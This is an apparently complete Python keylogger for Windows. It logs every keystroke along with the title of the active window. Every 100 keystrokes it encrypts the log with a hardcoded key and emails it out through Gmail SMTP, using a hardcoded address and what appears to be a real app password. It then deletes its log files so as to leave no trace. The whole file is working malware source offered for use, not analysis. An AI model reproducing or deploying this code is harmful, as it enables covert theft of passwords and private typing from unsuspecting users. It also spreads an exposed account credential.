import logging
from cryptography.fernet import Fernet

#listening for 
from pynput.keyboard import Key, Listener
import os

# relevant librarires for exfil via email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import win32gui

def get_active_window_title():
    # Get the handle of the foreground window
    hwnd = win32gui.GetForegroundWindow()
    
    # Get the text (title) of that window
    window_title = win32gui.GetWindowText(hwnd)
    
    return window_title

# email stuffs
email_address = "testingtemp568@gmail.com"
password = "gwms hvfz hnga gazm" 
toaddr = "testingtemp568@gmail.com" 

#make a log file
log_dir = "key_log.txt"
e_log_dir = "e_key_log.txt"

key="_Xsx521ZIOq3YSE6Ox0EnBkG6Mv8DfPQ-eff0ZArPAQ="

# exfil via email to testing gmail account
def send_email(filename, attachment, toaddr):

    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "see attached"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

# send_email(log_dir, log_dir, toaddr)

logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format="%(asctime)s: %(message)s")

count = 0

# encrypt log file
def encrypt():
    with open(log_dir, "rb") as f:
        data = f.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(e_log_dir, "wb") as f:
            f.write(encrypted)

        send_email(e_log_dir, e_log_dir, toaddr)

# release logging file to clean up log.txt files
def release_log_file():
    logger = logging.getLogger()
    
    # Copy the list of handlers and iterate over it
    for handler in logger.handlers[:]:
        # If the handler is writing to a file, close it and remove it
        if isinstance(handler, logging.FileHandler):
            handler.close()
            logger.removeHandler(handler)


# delete files leave no trace and stuff
def cleanup():
    try: 
        release_log_file()
        os.remove(e_log_dir)
        os.remove(log_dir)
    except Exception as e:
        print(f'still couldnt delete{e}', )

# send email every 100 keystrokes
def on_press(key):
    curr_window = get_active_window_title()
    logging.info(curr_window + " |" + str(key))
    global count
    count += 1
    if count == 100:
        print(100)
        encrypt()
        send_email(e_log_dir, e_log_dir, toaddr)
        count = 0
    if key == Key.esc:
        return False


with Listener(on_press=on_press) as listener:
    listener.join()
cleanup()